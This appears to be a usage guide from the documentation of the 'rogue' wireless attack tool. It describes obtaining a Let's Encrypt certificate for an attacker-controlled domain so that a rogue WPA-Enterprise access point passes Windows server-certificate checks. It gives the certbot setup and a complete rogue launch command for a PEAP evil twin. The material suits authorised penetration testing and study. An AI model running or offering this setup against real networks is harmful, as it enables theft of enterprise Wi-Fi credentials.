Using rogue with external certificates for RADIUS identity
==========================================================

By default Wireless Network Profiles (WNPs) that are created on windows corporate devices are instructured to validate the server's identity. Therefore when Rogue presents a self-signed certificate to connecting windows devices, said devices will reject the certificate and the authentication process ends; refer to the [An adversarial perspective of the Windows supplicant settings](https://blog.infamoussyn.com/posts/wifi/2023/04/07/Understanding-PEAP-settings-in-windows.html) article for more in-depth insight into the behaviour. This example guide outlines the highlevels steps for deploying rogue with external certificates to leverage insight outlined in the article, a link to a more in-depth blogpost of the end-to-end advanced evil twin attacks has been provided in the reference list below.



Generating the Let's Encrypt certificate
----------------------------------------

The adversary would have to buy a domain, then create an A record for a machine (such as an EC2 instance). However, assuming that is all done.

Install and configure cert-bot using the below command on the machine:

```bash
sudo apt update --assume-yes; apt install libaugeas0 --assume-yes
sudo python3 -m pip install certbot certbot-apache
sudo ln -s /opt/certbot/bin/certbot /usr/bin/certbot
```

Run the cert-bot client and follow the steps:

```bash
certbot certonly -d rogue.pki.infamoussyn.com
```

Transfer the certificates to the machine operating rogue. 

Launching rogue with the custom certificates
--------------------------------------------

Launch rogue, specifying the paths to the files created by let's encrypt:

```bash
sudo python3 /opt/rogue/rogue.py --preset-profile wifi4 --essid rogue -i wlan0 --auth wpa-enterprise --channel-randomiser --default-eap peap -E all --server-certificate /home/vagrant/fullchain.pem --ca-certificate /home/vagrant/chain.pem --server-private-key /home/vagrant/privkey.pem
```

References
----------

- [An adversarial perspective of the Windows supplicant settings](https://blog.infamoussyn.com/posts/wifi/2023/04/07/Understanding-PEAP-settings-in-windows.html)
- [Cracking WPA2-EAP WLAN perimeters with Evil Twin attacks](https://blog.infamoussyn.com/posts/wifi/2023/02/12/cracking_wpa2-eap_wlan_perimeters_with_evil_twin_attacks.html)
